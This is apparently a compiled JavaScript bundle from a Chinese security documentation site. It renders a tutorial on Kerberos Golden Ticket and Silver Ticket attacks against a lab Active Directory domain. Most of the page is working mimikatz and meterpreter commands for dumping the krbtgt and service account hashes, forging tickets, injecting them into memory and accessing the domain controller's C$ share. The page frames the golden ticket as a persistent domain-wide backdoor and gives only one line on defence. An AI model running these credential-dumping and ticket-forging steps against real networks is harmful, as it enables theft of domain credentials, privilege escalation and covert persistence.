(window.webpackJsonp=window.webpackJsonp||[]).push([[33],{759:function(s,e,a){"use strict";a.r(e);var t=a(103),r=Object(t.a)({},(function(){var s=this,e=s.$createElement,a=s._self._c||e;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"黄金票据和白银票据"}},[s._v("黄金票据和白银票据 "),a("a",{staticClass:"header-anchor",attrs:{href:"#黄金票据和白银票据"}},[s._v("#")])]),s._v(" "),a("h2",{attrs:{id:"黄金票据-golden-ticket"}},[s._v("黄金票据（Golden Ticket） "),a("a",{staticClass:"header-anchor",attrs:{href:"#黄金票据-golden-ticket"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("黄金票据：即伪造的"),a("code",[s._v("TGT")]),s._v("票据，当攻击者拥有了高权限的TGT，就可以发送给KDC的TGS 换取"),a("code",[s._v("任意Server")]),s._v("的票据（ST）。")]),s._v(" "),a("p",[s._v("有了金票就有了当前域内的最高控制权限。")])]),s._v(" "),a("p",[s._v("金票的"),a("strong",[s._v("利用原理")]),s._v("是直接跳过了KDC的AS认证过程（AS-REQ、AS-REP通信）。")]),s._v(" "),a("p",[s._v("由于黄金票据是伪造的TGT，它作为TGS-REQ的一部分被发送到KDC的TGS，以获取服务票据ST。")]),s._v(" "),a("p",[s._v("伪造的黄金票据是 有效的TGT票据，因为它是由域账号"),a("code",[s._v("krbtgt")]),s._v("的"),a("code",[s._v("NTLM Hash")]),s._v("加密和签名的。")]),s._v(" "),a("p",[s._v("TGT用于向KDC的TGS服务证明Client已经过AS认证，TGT可以被该域内的任何KDC服务器解密。")]),s._v(" "),a("p",[a("strong",[s._v("1、导出"),a("code",[s._v("krbtgt")]),s._v("的"),a("code",[s._v("NTML Hash")])])]),s._v(" "),a("p",[s._v("域管理员权限运行mimikatz（或其它域主机的本地管理员账号密码和域控相同也行）")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mimikatz.exe "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"lsadump::dcsync /user:krbtgt"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#MSF中的hashdump也可以")]),s._v("\nmeterpreter"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" hashdump\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("strong",[s._v("2、获取域中所有用户SID")])]),s._v(" "),a("p",[s._v("应用的时候，去掉SID最后的数字")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#只要是域用户权限就行")]),s._v("\nwmic useraccount get name,sid\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("3、制造黄金票据")])]),s._v(" "),a("p",[a("strong",[s._v("（1）清空现有票据")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mimikatz.exe "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"kerberos::purge"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("（2）生成票据")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mimikatz.exe "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"kerberos::golden /admin:Administrator /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /krbtgt:a8424e3f13e1253ea732a5245f2f4266 /ticket:Administrator.kiribi"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("4、将票据注入内存")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mimikatz.exe "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"kerberos::ptt Administrator.kiribi"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("5、检索当前会话中的票据")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mimikatz.exe "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"kerberos::tgt"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("6、权限验证")])]),s._v(" "),a("p",[s._v("列出域控的C盘")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("dir \\\\DC\\c$\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("使用meterpreter中的kiwi模块")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("meterpreter"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" load kiwi\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#创建票据")]),s._v("\nmeterpreter"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" golden_ticket_create -d wintrysec.lab -u Administrator -s S-1-5-21-1160434164-3042164129-2463410311 -k a8424e3f13e1253ea732a5245f2f4266 -t /tmp/krbtgt.ticket\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#注入到内存")]),s._v("\nmeterpreter"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" kerberos_ticket_use /tmp/krbtgt.ticket\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#然后验证权限")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("DC"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("c$\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("blockquote",[a("p",[a("strong",[s._v("当拿到域控后，通过伪造黄金票据，可以在域中留下一个畅通全域的后门")])]),s._v(" "),a("p",[s._v("**防御方法：**修改域管理员密码后，同时也要修改"),a("code",[s._v("krbtgt")]),s._v("用户的密码")])]),s._v(" "),a("h2",{attrs:{id:"白银票据-silver-ticket"}},[s._v("白银票据 （Silver Ticket） "),a("a",{staticClass:"header-anchor",attrs:{href:"#白银票据-silver-ticket"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("白银票据")]),s._v("：即伪造的"),a("code",[s._v("TGS")]),s._v("票据，也称服务票据ST。")]),s._v(" "),a("p",[s._v("攻击者通过伪造合法的TGS，可以直接发送给Server，访问指定的某个服务。")]),s._v(" "),a("p",[s._v("当拥有Server(Service) Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。")]),s._v(" "),a("p",[s._v("Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。")]),s._v(" "),a("p",[s._v("因此，银票的关键也在于Server的HTLM-Hash")])]),s._v(" "),a("p",[a("strong",[s._v("获取Server（目标服务器）的NTML hash")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mimikatz.exe "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"privilege::debug"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"sekurlsa::logonpasswords"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("或MSF模块")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("meterpreter "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" load mimikatz\nmeterpreter "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" msv\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("制造白银票据")])]),s._v(" "),a("p",[a("strong",[s._v("（1）清空当前系统的票据")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#使用系统命令")]),s._v("\nklist purge\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("（2）伪造票据")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("mimikatz.exe "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"kerberos::golden /domain:wintrysec.lab /sid:S-1-5-21-1160434164-3042164129-2463410311 /target:DC.wintrysec.lab /service:CIFS /rc4:f0e889883425d83b0071e789507b3e6b /user:admin666 /ptt"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("（3）验证权限")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("dir \\\\DC\\c$\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"黄金票据和白银票据的不同"}},[s._v("黄金票据和白银票据的不同 "),a("a",{staticClass:"header-anchor",attrs:{href:"#黄金票据和白银票据的不同"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("访问权限不同：")])]),s._v(" "),a("ul",[a("li",[s._v("Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限")]),s._v(" "),a("li",[s._v("Silver Ticket：伪造TGS，只能访问指定的服务")])]),s._v(" "),a("p",[a("strong",[s._v("加密方式不同：")])]),s._v(" "),a("ul",[a("li",[s._v("Golden Ticket由Kerberos的Hash加密")]),s._v(" "),a("li",[s._v("Silver Ticket由服务账号（通常为计算机账户）Hash加密")])]),s._v(" "),a("p",[a("strong",[s._v("认证流程不同：")])]),s._v(" "),a("ul",[a("li",[s._v("Golden Ticket的利用过程需要访问域控，")]),s._v(" "),a("li",[s._v("而Silver Ticket不需要")])])])}),[],!1,null,null,null);e.default=r.exports}}]);